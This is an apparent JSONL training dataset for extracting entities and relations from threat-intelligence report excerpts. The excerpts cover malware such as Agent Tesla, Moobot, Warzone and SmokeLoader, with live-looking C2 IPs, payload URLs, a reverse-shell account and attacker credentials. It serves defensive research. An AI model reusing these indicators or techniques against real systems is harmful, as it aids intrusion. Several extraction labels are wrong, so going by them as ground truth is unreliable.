{"instruction": "In general, for the security plugins it cannot bypass, it only reports them to the C2 server by updating the global status message with information similar to the data it sends during a successful login. But it uses \u201c3GOOD\u201d for the brute force status to indicate that credential validation was skipped. On encountering websites that contain the string \u201c1gb.ru\u201d within the page content, GoTrim also sends the same \u201c3GOOD\u201d brute force status. This appears to be a conscious decision to avoid targeting websites hosted by this provider, but the intent remains unclear. Campaign Updates While searching for other samples related to this campaign, we found a PHP script and binary from September 2022 with different URLs \u201c/selects?param=1\u201d and \u201c/selects?walert=1\u201d on C2 server 89[.]208[.]107[.]12 (Figure 6). The PHP script we detect as PHP/GoTrim!tr.dldr uses the same installation method, with only the download URL varying across the samples we gathered.", "input": null, "output": "Named Entities: (security plugins, tool), (C2 server, tool), (PHP script, tool), (binary, tool), (89[.]208[.]107[.]12, IP), (PHP/GoTrim!tr.dldr, malware)\nRelationships: (security plugins, bypass, C2 server), (C2 server, IP, 89[.]208[.]107[.]12), (PHP script, use, C2 server), (binary, use, C2 server), (PHP/GoTrim!tr.dldr, name, PHP/GoTrim!tr.dldr)"}
{"instruction": "Technical Analysis - Initialization\nZerobot first checks its connection to 1.1.1.1, the DNS resolver server from Cloudflare.\nIt then copies itself onto the targeted device based on the victim\u2019s OS type. For Windows, it copies itself to the \u201cStartup\u201d folder with the filename \u201cFireWall.exe\u201d. Linux has three file paths: \u201c%HOME% \u201c, \u201c/etc/init/\u201d, and \u201c/lib/systemd/system/\u201d.\nIt then sets up an \u201cAntiKill\u201d module to prevent users from disrupting the Zerobot program. This module monitors a particular hex value and uses \u201csignal.Notify\u201d to intercept any signal sent to terminate or kill the process.", "input": null, "output": "Named Entities: (Zerobot, malware), (1.1.1.1, IP)\nRelationships: (Zerobot, check connection, 1.1.1.1)"}
{"instruction": "To establish persistence, it also copies itself to the following path: C:\\Users\\Admin\\Documents\\Adobe5151.exe Warzone also uses encrypted communication with its C2 server. In the past, the password/key for the encryption was the string \u2018warzone160\\x00\u2019. In this sample, it has been changed to the string \u2018nevergonnagiveyouup\u2019 (Figure 18). So, the victim is being rickrolled without even knowing it. Dynamic analysis shows that the C2 server\u2019s address is 171.22.30.72:5151. Looking up this IP and port number in our internal systems shows the diagram in Figure 19. What we can see from this chart is that the campaign where this particular attack was involved started as early as June 20, 2022.", "input": null, "output": "Named Entities: (Warzone, malware), (C2 server, tool), (C:\\Users\\Admin\\Documents\\Adobe5151.exe, file), (171.22.30.72:5151, IP)\nRelationships: (Warzone, persistence, C:\\Users\\Admin\\Documents\\Adobe5151.exe), (Warzone, communication, C2 server), (C2 server, address, 171.22.30.72:5151)"}
{"instruction": "A remote attacker may be able to exploit this vulnerability to leak sensitive information within the context of the application via a crafted PCT file. Fortinet released IPS signature Autodesk.Design.Review.CVE-2022-42944.Memory.Corruption for this specific vulnerability to proactively protect our customers. CVE-2022-33890: This is a Memory Corruption vulnerability that exists in the decoding of Macintosh Pict \u2018PCT\u2019 files in Autodesk Design Review. Specifically, the vulnerability is caused by a malformed PCT file, which causes Memory Corruption due to an improper bounds check. Attackers can exploit this vulnerability to execute arbitrary code within the context of the application via a crafted PCT file. Fortinet released IPS signature Autodesk.Design.Review.CVE-2022-33890.Remote.Code.Execution for this specific vulnerability to proactively protect our customers. CVE-2022-27526:", "input": null, "output": "Named Entities: (remote attacker, attacker), (CVE-2022-42944, vulnerability), (CVE-2022-33890, vulnerability), (CVE-2022-27526, vulnerability)\nRelationships: No related relationships."}
{"instruction": "Fortinet previously released IPS signature Adobe.InDesign.CVE-2022-28853.Arbitrary.Code.Execution for this specific vulnerability to proactively protect our customers. CVE-2022-28854: This Out-of-Bounds Read vulnerability exists in the decoding of QuarkXPress Drawing \u2018QXD\u2019 files in Adobe InDesign. Specifically, the vulnerability is caused by a malformed QXD file, which causes an out of bounds memory read due to an improper bounds check. Attackers can exploit this vulnerability to leak sensitive information within the context of the application via a crafted QXD file. Fortinet previously released IPS signature Adobe.InDesign.CVE-2022-28854.Memory.Leak for this specific vulnerability to proactively protect our customers. CVE-2022-28855: This Out-of-Bounds Read vulnerability exists in the decoding of QuarkXPress Drawing \u2018QXD\u2019 files in Adobe InDesign. Specifically, the vulnerability is caused by a malformed QXD file, which causes an out of bounds memory read due to an improper bounds check.", "input": null, "output": "Named Entities: (Fortinet, tool), (IPS signature Adobe.InDesign.CVE-2022-28853.Arbitrary.Code.Execution, vulnerability), (Adobe InDesign, tool), (CVE-2022-28854, vulnerability), (IPS signature Adobe.InDesign.CVE-2022-28854.Memory.Leak, vulnerability), (CVE-2022-28855, vulnerability)\nRelationships: (Fortinet, release, IPS signature Adobe.InDesign.CVE-2022-28853.Arbitrary.Code.Execution), (Fortinet, release, IPS signature Adobe.InDesign.CVE-2022-28854.Memory.Leak), (Adobe InDesign, vulnerability, CVE-2022-28855)"}
{"instruction": "In this instance, a return of \u201cVelvetSweatshop\u201d is given. This is interesting as this is effectively a default document password recognized by Excel. It allows data to be encrypted but won\u2019t prompt a user to enter a password to access the file. By combining the two tools mentioned above using a pipe (\u201c|\u201d), the full decrypted scope of the OLE stream in question is provided, and the target of the next stage of the attack is shown. This stage uses the first of the two exploits involved in this attack, CVE-2017-0199. It also includes an embedded link that will attempt to download the file \u201creceipt.doc\u201d from 192[.]227[.]129[.]26", "input": null, "output": "Named Entities: (Excel, tool), (CVE-2017-0199, vulnerability), (receipt.doc, file), (192[.]227[.]129[.]26, IP)\nRelationships: (Excel, combine, CVE-2017-0199), (CVE-2017-0199, exploit, receipt.doc), (receipt.doc, download from, 192[.]227[.]129[.]26)"}
{"instruction": "Initial analysis of \u201creceipt.doc\u201d turns up some interesting oddities. As shown in Figure 7, Exiftool (a tool for examining file metadata) returns an error when run against \u201creceipt.doc\u201d. Opening the file and viewing it directly shows the scope of what is being attempted. It becomes immediately apparent that this file is not a Microsoft Word document. Instead, it is a Rich Text File (RTF). This file is designed to take advantage of the second of the two vulnerabilities mention, CVE-2017-11882, a stack overflow vulnerability in the Microsoft Equation Editor that enables remote code execution on a vulnerable system. The \u201creceipt.doc\u201d file reaches out again to 192[.]227[.]129[.]26 and downloads vbc.exe. This is SmokeLoader. vbc.exe Starting at the beginning with \u201cvbc.exe\u201d and viewing its details as seen by the operating system, this file presents itself as a Microsoft .NET executable.", "input": null, "output": "Named Entities: (Exiftool, tool), (CVE-2017-11882, vulnerability), (Microsoft Equation Editor, tool), (192[.]227[.]129[.]26, IP), (vbc.exe, file), (SmokeLoader, malware)\nRelationships: No related relations."}
{"instruction": "All interactions transmitted by client and server are in the form of lines, that is, strings that end with a carriage return and line feeds. The first thing clients need to do is to make a connection to the remote server on a specific port. In this case, we use openssl to connect to a custom IMAP server from a terminal. $ openssl s_client -connect 192.168.0.2:993 \u2013crlf ... server verifications removed for brevity... * OK IMAP4rev1 Service Ready Noticed that server status response is prefixed with \u201c*\u201d, called untagged response, that indicates server greeting, or server status that does not indicate the completion of a command (for example, an impending system shutdown alert).", "input": null, "output": "Named Entities: (IMAP server, tool), (192.168.0.2:993, IP)\nRelationships: No related relations."}
{"instruction": "CVE-2022-34275 \u2013 Attackers can exploit this vulnerability to execute arbitrary code within the context of the application via a crafted PCB file. Fortinet released IPS signature Siemens.PADS.Layout.Viewer.CVE-2022-34275.Memory.Corruption for this specific vulnerability. CVE-2022-34276 \u2013 Attackers can exploit this vulnerability to execute arbitrary code within the context of the application via a crafted PCB file. Fortinet released IPS signature Siemens.PADS.Layout.Viewer.CVE-2022-34276.Memory.Corruption for this specific vulnerability. CVE-2022-34277 \u2013 Attackers can exploit this vulnerability to execute arbitrary code within the context of the application via a crafted PCB file. Fortinet released IPS signature Siemens.PADS.Layout.Viewer.CVE-2022-34277.Memory.Corruption for this specific vulnerability. CVE-2022-34278 \u2013 Attackers can exploit this vulnerability to execute arbitrary code within the context of the application via a crafted PCB file. Fortinet released IPS signature Siemens.PADS.Layout.Viewer.CVE-2022-34278.Memory.Corruption for this specific vulnerability.", "input": null, "output": "Named Entities: (CVE-2022-34275, vulnerability), (CVE-2022-34276, vulnerability), (CVE-2022-34277, vulnerability), (CVE-2022-34278, vulnerability), (Siemens.PADS.Layout.Viewer.CVE-2022-34275.Memory.Corruption, tool), (Siemens.PADS.Layout.Viewer.CVE-2022-34276.Memory.Corruption, tool), (Siemens.PADS.Layout.Viewer.CVE-2022-34277.Memory.Corruption, tool), (Siemens.PADS.Layout.Viewer.CVE-2022-34278.Memory.Corruption, tool)\nRelationships: (CVE-2022-34275, IPS signature, Siemens.PADS.Layout.Viewer.CVE-2022-34275.Memory.Corruption), (CVE-2022-34276, IPS signature, Siemens.PADS.Layout.Viewer.CVE-2022-34276.Memory.Corruption), (CVE-2022-34277, IPS signature, Siemens.PADS.Layout.Viewer.CVE-2022-34277.Memory.Corruption), (CVE-2022-34278, IPS signature, Siemens.PADS.Layout.Viewer.CVE-2022-34278.Memory.Corruption)"}
{"instruction": "When DNS is queried for a domain, a DNS server returns an IP address that points to the requested domain. The malware then checks the first octet of the IP address to ensure the value is at least 128 to be considered valid. Perhaps this is a way for the malware to avoid internal IP addresses, such as the 127[.]0[.]0[.]1 local loopback address or the 10[.]0[.]0[.]0 internal subnet. Lines 260-261 are used to define the byte array DnsClass._ReceiveData with a size defined by the remaining octets. For example, a DNS test server is set up to return the IP address 192[.]5[.]4[.]3 for any DNS requests. That means the byte array has a size of 0x050403. Later in the malware\u2019s execution flow, this data from the DNS request is used to define TaskClass properties.", "input": null, "output": "Named Entities: (DNS server, tool), (192[.]5[.]4[.]3, IP)\nRelationships: No related relations."}
{"instruction": "This domain, which may be imitating WorldRemit for Asia, was created on the same day as the first C2 server, on February 27, 2022. Around April 19, 2022, this domain also resolved to 127[.]0[.]0[.]1. Prior to that, however, it resolved to 193[.]239[.]84[.]207. In the past, this IP address has been used by the NSO group with their Pegasus spyware. According to our telemetry, this IP address has also been used by APT34/OilRig/Helix Kitten and GoziIFSB. It has also been used as a VPN address. Passive DNS records indicate the IP address is currently hosting several suspiciously-named domains, some of which are listed below.", "input": null, "output": "Named Entities: (C2 server, tool), (127[.]0[.]0[.]1, IP), (193[.]239[.]84[.]207, IP), (NSO group, attacker), (Pegasus spyware, malware), (APT34/OilRig/Helix Kitten, attacker), (GoziIFSB, attacker)\nRelationships: No related relations."}
{"instruction": "Fortinet released IPS signature Autodesk.DWG.TrueView.CVE-2022-27523.Memory.Corruption for this specific vulnerability to proactively protect our customers. CVE-2022-27524 This is an out-of-bounds read vulnerability that exists in the decoding of AutoCAD Drawing \u2018DWG\u2019 files in Autodesk DWG TrueView. Specifically, the vulnerability is caused by a malformed DWG file, which causes an Out of Bounds Read memory access due to an improper bounds check. A remote attacker may be able to exploit this vulnerability to leak sensitive information within the context of the application via a crafted DWG file. Fortinet released IPS signature Autodesk.DWG.TrueView.CVE-2022-27524.Memory.Corruption for this specific vulnerability to proactively protect our customers. Learn more about FortiGuard Labs global threat intelligence and research and the FortiGuard Security Subscriptions and Services portfolio.", "input": null, "output": "Named Entities: (CVE-2022-27523, vulnerability), (CVE-2022-27524, vulnerability), (Autodesk DWG TrueView, tool)\nRelationships: (Fortinet, release, IPS signature Autodesk.DWG.TrueView.CVE-2022-27523.Memory.Corruption), (Fortinet, release, IPS signature Autodesk.DWG.TrueView.CVE-2022-27524.Memory.Corruption), (Autodesk DWG TrueView, vulnerability, IPS signature Autodesk.DWG.TrueView.CVE-2022-27524.Memory.Corruption)"}
{"instruction": "This instance also uses an interesting deployment method. It uses the ISO format, which is mounted automatically as a disk in Windows. ISO files can also be used to create bootable CD-ROMs or install an operating system or virtual machine. It also contains a LNK (shortcut file) used to launch a DLL (Dynamic-link Library). This blog details the infection process and subsequent malware deployment by the threat actors behind IcedID. Affected Platforms: Windows Impacted Users: Windows users Impact: Compromised machines are under the control of the threat actor Severity Level: Medium The Phishing E-mail The e-mail originated from an IP address in Belize, at 179[.]60[.]150[.]96. It spoofs the originating e-mail address to appear to have been sent from another fuel provider in Ukraine. The e-mail contains both English and Ukrainian elements and looks realistic given the mention of extra security measures regarding the attachment.", "input": null, "output": "Named Entities: (IcedID, malware), (179[.]60[.]150[.]96, IP)\nRelationships: (IcedID, deployed by, threat actors)"}
{"instruction": "Mytob was one of the first viruses to specifically block or work against anti-virus software by preventing connectivity from the victims\u2019 machine to various update sites. This was done by redirecting all known vendor URIs to 127.0.0.1, a localhost IP. This caused all queries to public-facing websites to resolve to the machine itself, essentially going nowhere. Mytob was very prolific for its time and was consistently listed at the top of Top 10 charts. It had so many variants with different functionalities that anti-virus companies often had the entire alphabet appended to the malware name.", "input": null, "output": "Named Entities: (Mytob, malware), (anti-virus software, tool), (127.0.0.1, IP)\nRelationships: (Mytob, block, anti-virus software), (Mytob, redirect, 127.0.0.1)"}
{"instruction": "This Soul module closely resembles the original backdoor in terms of functionality, although its code is much neater. Thorough examination revealed that the code of the original backdoor was reorganized as various exports. For instance, the code responsible for sending and receiving HTTP messages was divided into the SendMsg \u200b\u200b\u200b\u200b\u200b\u200b\u200band RecvMsg \u200b\u200b\u200b\u200b\u200b\u200b\u200bexports. Configuration The SoulSearcher calls the module\u2019s BeginConnect export with the configuration as an argument. The configuration has the same binary format as the original backdoor\u2019s configuration but without the service-related fields. Communication Unlike the original backdoor, this Soul module only receives commands as a client. If resolving the server address via gethostbyname API fails, the backdoor also tries querying two hardcoded DNS servers using an undocumented feature of the DnsQuery API: 193.0.14.129 (DNS root server) 8.8.8.8 (Google Public DNS)", "input": null, "output": "Named Entities: (Soul module, malware), (original backdoor, malware), (SoulSearcher, tool), (193.0.14.129, IP), (8.8.8.8, IP)\nRelationships: (Soul module, resemble, original backdoor), (original backdoor, reorganized as, Soul module)"}
{"instruction": "The C2 server (205[.]185[.]118[.]52) this particular BitRAT variant connects to belongs to FranTech Solutions, a hosting provider that is known as a bulletproof hosting service provider. A bulletproof hosting service is just like a regular web hosting service in that they are used to store content. The difference is that a bulletproof hosting service also hosts illegal content, such as malware, C2, exploit kits, and fake shopping sites. They also tend to be more resistant to complaints and takedown requests. Conclusion In this attack, NFT was used to lure a victim into opening a malicious XLSM file to deliver BitRAT, which put the victim\u2019s data and machine at risk.", "input": null, "output": "Named Entities: (205[.]185[.]118[.]52, IP), (FranTech Solutions, attacker), (bulletproof hosting service provider, tool), (C2, threat type), (fake shopping sites, threat type), (BitRAT, malware)\nRelationships: (C2 server, belongs to, FranTech Solutions)"}
{"instruction": "This is a Null-Pointer Dereference vulnerability that exists in the decoding of CorelDraw Drawing (CDR) files in Adobe Illustrator. Specifically, the vulnerability is caused by a malformed CDR file, which causes a NULL pointer dereference. Attackers can exploit this vulnerability with a crafted CDR file, potentially leading to an application denial-of-service. Fortinet released IPS signature Adobe.Illustrator.CVE-2022-23199.NULL.Pointer.Dereference for this specific vulnerability to proactively protect our customers CVE-2022-23203 This is a Buffer Overflow vulnerability existing in the decoding of Universal 3D (U3D) files in Adobe Photoshop. Specifically, the vulnerability is caused by a malformed U3D file, which causes an Out of Bounds memory access due to improper bounds check. The specific vulnerability exists in the \u2018U3D\u2019 plugin. A remote attacker may be able to exploit this vulnerability to execute arbitrary code within the context of the application via a crafted U3D file.", "input": null, "output": "Named Entities: (Adobe Illustrator, tool), (Fortinet, tool), (CVE-2022-23199, vulnerability), (Adobe Photoshop, tool), (U3D plugin, tool), (remote attacker, attacker)\nRelationships: (Adobe Photoshop, exploited by, remote attacker)"}
{"instruction": "NordVPN\nOpenVPN\nProtonVPN\nC2 Infrastructure\nThis variant uses 207[.]32.217.89 as its C2 server through port 14588. This IP is owned by 1gservers. Over the course of the few weeks after this variant was released, we noticed one IP address in particular communicating with this C2 server. Some telemetry data is shown below.\nIP Address\nStart Time\nEnd Time\n149.154.167.91\n2021-11-26 04:34:54\n2021-11-26 10:05:15\n149.154.167.91\n2021-12-05 12:06:03\n2021-12-05 13:19:35\n149.154.167.91\n2021-12-09 16:18:46\n2021-12-09 20:00:13\n149.154.167.91\n2021-12-22 18:38:18\n2021-12-23 11:33:58", "input": null, "output": "Named Entities: (NordVPN, tool), (OpenVPN, tool), (ProtonVPN, tool), (C2 server, tool), (207[.]32.217.89, IP), (149.154.167.91, IP)\nRelationships: (NordVPN, C2 server, 207[.]32.217.89), (OpenVPN, C2 server, 207[.]32.217.89), (ProtonVPN, C2 server, 207[.]32.217.89), (149.154.167.91, communicate with, C2 server)"}
{"instruction": "After successfully calling \"ClassLibrary3.Class1.Run()\" of the decoded PE, it downloads two files from the hyperlinks: 'hxxp[:]//149.56.200.165/rump/1.txt', which is for another .Net module to perform process-hollowing, and 'hxxps[:]//bitbucket[.]org/!api/2.0/snippets/hogya/nxq8od/c73df176f221868c33d4b3033ec04dc173d4ba4c/files/divine1-1', which is passed from PowerShell and is where it downloads the Agent Tesla payload from. The Agent Tesla payload is fileless on the victim\u2019s system. It is only kept in the memory of the PowerShell process. The downloaded .Net module has a function named \u201cClassLibrary1.Class1.Run()\u201d that perform the process-hollowing. It passes the Agent Tesla payload in memory and adds a path of the target process \u201cRegAsm.exe\u201d. \u201cRegAsm.exe\u201d is an official component of Microsoft .Net Framework. The attacker uses it as a target process in which to inject malware to protect itself from being detected. A number of Windows API functions are called in the .Net module to deploy the Agent Tesla payload into the target process. These are:", "input": null, "output": "Named Entities: (149.56.200.165, IP), (hxxp[:]//149.56.200.165/rump/1.txt, URL), (PowerShell, tool), (Agent Tesla, malware), (RegAsm.exe, file), (Microsoft .Net Framework, tool)\nRelationships: (PowerShell, download, Agent Tesla), (RegAsm.exe, target process of, malware)"}
{"instruction": "First, because the final Moobot will be saved as \u201cmacHelper,\u201d it first tries to remove any file already named \u201cmacHelper.\u201d It then echoes code into \u201cdownloader,\u201d which is a small ELF 32-bit LSB ARM file. After downloader completes downloading, it executes Moobot with the parameter \u201chikivision\u201d. Finally, it changes commonly used commands, such as \u201creboot,\u201d to prevent an administrator from invoking reboot on the affected device.\u00a0\nStage 1 - Downloader\u00a0\nThe attacker leverages this vulnerability to drop a downloader (SHA256: 1DCE6F3BA4A8D355DF21A17584C514697EE0C37B51AB5657BC5B3A297B65955F). It has only one job: download the main botnet. It downloads the malware with \u201c/arm5\u201d URI form server 199.195.250[.]233:80 and prints\u00a0\u201cRAY\u201d if the downloading process was successful. The following image shows the disassembled code:\nFrom the IP address we not only get the moobot variants for different architectures, we also get the historic malware from directory \u201c/h/\u201c.", "input": null, "output": "Named Entities: (Moobot, malware), (1DCE6F3BA4A8D355DF21A17584C514697EE0C37B51AB5657BC5B3A297B65955F, SHA256), (199.195.250[.]233:80, IP)\nRelationships: No related relations."}
{"instruction": "This is a Memory Leak vulnerability that exists in the decoding of AutoCAD Drawing \u2018DWG\u2019 files in Adobe Illustrator. Specifically, the vulnerability is caused by a malformed DWG file, which causes an Out of Bounds Read memory access due to an improper bounds check. Attackers can exploit this vulnerability for unintended memory reads, potentially leading to a memory data leak. Fortinet previously released IPS signature Adobe.Illustrator.CVE-2021-40718.Memory.Leak for this specific vulnerability to proactively protect our customers. CVE-2021-40746: This is an Arbitrary Code Execution vulnerability that exists in the decoding of AutoCAD Drawing \u2018DWG\u2019 files in Adobe Illustrator. Specifically, the vulnerability is caused by a malformed DWG file, which causes an Out of Bounds memory access due to an improper bounds check. Attackers can exploit this vulnerability to execute arbitrary code within the context of the application via a crafted DWG file.", "input": null, "output": "Named Entities: (Adobe Illustrator, tool), (CVE-2021-40718, vulnerability), (CVE-2021-40746, vulnerability), (Fortinet, tool), (IPS signature Adobe.Illustrator.CVE-2021-40718.Memory.Leak, tool)\nRelationships: (Fortinet, released, IPS signature Adobe.Illustrator.CVE-2021-40718.Memory.Leak)"}
{"instruction": "Cryptojacking\nAfter exploiting CVE-2021-26084, it downloads init.sh from 86.105.195[.]120. The shell is a crypto miner that includes following tasks:\nDelete syslog\nChange commonly used command\nStop aliyun services and\u00a0apparmor\nSet the path for miner execution file (zzh) and itself but rename as newinit.sh\nKill all other miner processes\nUse crontab to establish persistence\nGet scanning shell (is.sh)\u00a0\nClean the trace", "input": null, "output": "Named Entities: (CVE-2021-26084, vulnerability), (86.105.195[.]120, IP), (init.sh, file), (crypto miner, malware), (newinit.sh, file), (is.sh, file)\nRelationships: (CVE-2021-26084, exploited by, crypto miner), (crypto miner, download, init.sh), (crypto miner, set path for, newinit.sh), (crypto miner, get, scanning shell)"}
{"instruction": "In the scanning shell, it will try to download a scanning tool, like Masscan, Pnscan, etc, which can be used to scan and survey IPv4 TCP network in order to discover live host to proceed the spreading. The downloader path is shown as below. It also downloads a shell that defines specific steps for the scan. First, get the login brute force tool hxx (md5: f0551696774f66ad3485445d9e3f7214) and account/password list ps (md5: a43ad8a740081f0b5a89e219fe8475a3), then scan the subnet belong to private network (172.16.0.0/12, 192.168.0.0/16, 10.0.0.0/8). This is to allow the malware to login into more\u00a0devices in\u00a0victim\u2019s intranet and spread miner script (init.sh).", "input": null, "output": "Named Entities: (scanning shell, tool), (Masscan, tool), (Pnscan, tool), (hxx, tool), (f0551696774f66ad3485445d9e3f7214, MD5), (ps, tool), (a43ad8a740081f0b5a89e219fe8475a3, MD5), (172.16.0.0/12, IP), (192.168.0.0/16, IP), (10.0.0.0/8, IP), (init.sh, file)\nRelationships: (scanning shell, try to download, scanning tool), (shell, get, login brute force tool), (shell, spread, miner script), (miner script, file, init.sh)"}
{"instruction": "Fileless Attack The observed packet is from 141.98.83.139 (AS 209588 Flyservers S.A.) and the main payload is b64 encoded. The decoded data is as follow: We can see that the payload is constructed and executed via PowerShell. The final execution will set \u201cWindowStyle\u201d to hidden and \u201cCreateNoWindow\u201d to True, which is to put itself out of sight. We decoded those data in the middle and replace {0} and {1} with \u201c=\u201d and \u201cP\u201d, then 2nd layer payload data It defined two functions, and one variable that contain the main exploit code. After converting the code in $sG, it will use VirtualAlloc to reserve a part of memory. Then it uses CreateThread to invoke the malicious code. So what exactly $sG is? After b64 decoding, we get about 570 bytes binary data as below:", "input": null, "output": "Named Entities: (141.98.83.139, IP), (PowerShell, tool)\nRelationships: No related relations."}
{"instruction": "To dive deep in to this, we have to check this binary by IDA. Following the first call into loc_D6, it puts ws2_32 and move edx, 726774ch, and this is the hash value of LoadLibrary function, the detail code is as below: It is a reverse shell meterpreter shellcode that connects to exploit source 141.98.83[.]139 via tcp port 23733. Since the port now is closed, we only managed to capture the following packets. But the entire attack process only leveraged PowerShell to decode layer by layer, and uses hidden window style to hide itself. And finally, create a thread to achieve the reverse shell. Not a single file is dropped in the entire attack, which is known as fileless attack.", "input": null, "output": "Named Entities: (IDA, tool), (ws2_32, tool), (141.98.83[.]139, IP), (PowerShell, tool)\nRelationships: No related relations."}
{"instruction": "Muhstik\nBy exploiting CVE-2021-26084, it downloads conf2 from 149.28.85[.]17. The file will deploy and execute dk86 from 188.166.137[.]241 and ldm script. The attack scenario afterward is analyzed in this\u00a0article, but we observed a different server IP and more attack source IP which is intended to spread conf2 of Muhstik.", "input": null, "output": "Named Entities: (Muhstik, malware), (CVE-2021-26084, vulnerability), (149.28.85[.]17, IP), (188.166.137[.]241, IP)\nRelationships: (Muhstik, exploit, CVE-2021-26084)"}
{"instruction": "Fortinet released the IPS signature Corel.Presentations.CVE-2021-38106.Memory.Corruption for this specific vulnerability to proactively protect our customers. CVE-2021-38102: This Memory Corruption Vulnerability exists in the decoding of PPT files in Corel Presentations 2020. Specifically, this vulnerability is caused by a malformed PPT file, which causes Out-of-Bounds memory access due to an improper bounds check. This specific vulnerability exists in the \u2018IPPP82.FLT\u2019 plugin. Attackers can exploit the vulnerability by using out-of-bounds access for unintended reads or an information leak attack. An unauthenticated attacker may be able to exploit this vulnerability to access unauthorized system memory in the context of the current user via a crafted PPT file. Fortinet released the IPS signature Corel.Presentations.CVE-2021-38102.Memory.Corruption for this specific vulnerability to proactively protect our customers. CVE-2021-38110:", "input": null, "output": "Named Entities: (Corel.Presentations.CVE-2021-38106.Memory.Corruption, vulnerability), (Corel Presentations 2020, tool), (IPPP82.FLT, file), (Corel.Presentations.CVE-2021-38102.Memory.Corruption, vulnerability), (CVE-2021-38102, vulnerability), (Fortinet, tool), (IPS signature, tool), (Corel.Presentations.CVE-2021-38110, vulnerability)\nRelationships: (Corel.Presentations.CVE-2021-38106.Memory.Corruption, exists in, Corel Presentations 2020), (Corel.Presentations.CVE-2021-38106.Memory.Corruption, released by, Fortinet), (Corel.Presentations.CVE-2021-38102.Memory.Corruption, exists in, Corel Presentations 2020), (Corel.Presentations.CVE-2021-38102.Memory.Corruption, released by, Fortinet), (Corel.Presentations.CVE-2021-38102.Memory.Corruption, exists in, IPPP82.FLT), (Corel.Presentations.CVE-2021-38102.Memory.Corruption, released by, Fortinet), (Corel.Presentations.CVE-2021-38110, released by, Fortinet)"}
{"instruction": "(Incidentally, the recipient of this particular email has had their email username and password posted online previously. And according to haveibeenpwned[.]com, this email address has also been exposed in four separate breaches.) Contained within the email is an attachment with the file name \u201cDetailed Invoice.xll.\u201d Looking at the attachment we can see that it is digitally signed and chains appropriately. The digital signature is assigned to HORUM, with a reference email address of admin[@]khorum[.]ru: The certificate appears to be valid until 3/24/2022: Visiting the website directly offers no further details as to what entity is behind this campaign: Same with the WHOIS information: The Infection Chain When the user opens the XLL file, the Excel file triggers on xlAutoOpen in a similar fashion to a macro. The following image shows the export name is the same. The export attempts to contact the following URL: hxxp://dmequest[.]com/dme/images/portfolio/products/1/csrsc.exe hosted on 68[.]67.75.66.", "input": null, "output": "Named Entities: (Detailed Invoice.xll, file), (hxxp://dmequest[.]com/dme/images/portfolio/products/1/csrsc.exe, URL), (68[.]67.75.66, IP)\nRelationships: (hxxp://dmequest[.]com/dme/images/portfolio/products/1/csrsc.exe, hosted on, 68[.]67.75.66)"}
{"instruction": "Consistent with the latest version of Buer Loader, this version was observed incorporating the whoami (https://github.com/libcala/whoami) RUST crate, which allows for details such as current user info including username, full name, preferred language, OS name/version, and environment it is located in. The version used is whoami-1.1.1, which was released on 2021-03-13 (https://github.com/libcala/whoami/blob/main/CHANGELOG.md) One interesting component of RUST are toolchains. In layman\u2019s terms, RUST toolchains are collections of programs along with multiple dependencies needed to compile a RUST application. RUST toolchains observed used so far by Buer were: ureq 2.0.2 A minimal HTTP request library minreq A simple, minimal-dependency HTTP client with less features than ureq. A user-agent string of \u201csomething/1.0.0\u201d Ring According to the official site, Ring is a safe, fast, small crypto focused on general-purpose cryptography. It uses RUST with BoringSSL's cryptography primitives. Finally, the file receives additional instructions from its command and control (C2) server: hxxps://shipmentofficedepot[.]com (195[.]123.234.11).", "input": null, "output": "Named Entities: (Buer Loader, malware), (whoami, tool), (whoami-1.1.1, tool), (ureq 2.0.2, tool), (minreq, tool), (Ring, tool), (hxxps://shipmentofficedepot[.]com, URL), (195[.]123.234.11, IP)\nRelationships: (Buer Loader, incorporate, whoami), (whoami, version, whoami-1.1.1), (Buer Loader, use, ureq 2.0.2), (Buer Loader, use, minreq), (Buer Loader, use, Ring), (Buer Loader, receive instructions from, hxxps://shipmentofficedepot[.]com), (hxxps://shipmentofficedepot[.]com, IP, 195[.]123.234.11)"}
{"instruction": "This archive is hosted on the IP address 80[.]85[.]157[.]3. Users will be redirected to another Google Drive link if the specified User-Agent conditions are not satisfied. At the time of writing, we were not able to retrieve the payloads, so we are unable to definitively determine if they are indeed malicious. We believe that this is a mechanism to deliver different payloads to different victims. It\u2019s worth noting that every source IP address, request header, and request URL, is logged upon each connection. All the logging files are then stored in the /static folder. The logging files: /static The \u201c/static\u201d folder contains a large number of logging files that are seemingly manually rotated by the threat actors. At the time of writing, the logging files recorded the logs from January 3, 2023, to March 29, 2023. There were 40 logging files in the folder at the time we found them.", "input": null, "output": "Named Entities: (80[.]85[.]157[.]3, IP)\nRelationships: No related relations."}
{"instruction": "Run freeSSHd and use plink to create a reverse connection with 51.195.49.215 using \u201cjohn\u201d as the username and \u201ceK6czNHWCT569L1xK9ZH\u201d as the password 31 Kill the freeSSHd process 32 Send .txt, .rtf, .xls, .xlsx, .ods, .cmd, .pdf, .vbs, .ps1, .one, .kdb, .kdb, .doc, .doc, .odt, .eml, .msg, and .email files in Downloads, Documents, and Desktop folders under %USERPROFILE% 34 Run AnyDesk on the victim\u2019s machine on a hidden window and send the AnyDesk ID to the C&C server 35 Kill the AnyDesk process and delete its executable 36 Download the AnyDesk executable and save it to %PUBLIC%\\Libraries\\dsk.exe 38 Download a file and save it to %PUBLIC%\\Libraries\\wallet.exe 39 Download a file and save it to %PUBLIC%\\Libraries\\7z.dll 40 Download a file and save it to %PUBLIC%\\Libraries\\7z.exe 41 Send the contents of %PUBLIC%\\Libraries\\tempFolder compressed with 7-Zip 42 Download a file and save it to %PUBLIC%\\Libraries\\7za.exe 43", "input": null, "output": "Named Entities: (freeSSHd, tool), (plink, tool), (51.195.49.215, IP), (AnyDesk, tool), (C&C server, tool), (%PUBLIC%\\Libraries\\dsk.exe, file), (%PUBLIC%\\Libraries\\wallet.exe, file), (%PUBLIC%\\Libraries\\7z.dll, file), (%PUBLIC%\\Libraries\\7z.exe, file), (%PUBLIC%\\Libraries\\7za.exe, file)\nRelationships: (freeSSHd, use, plink)"}
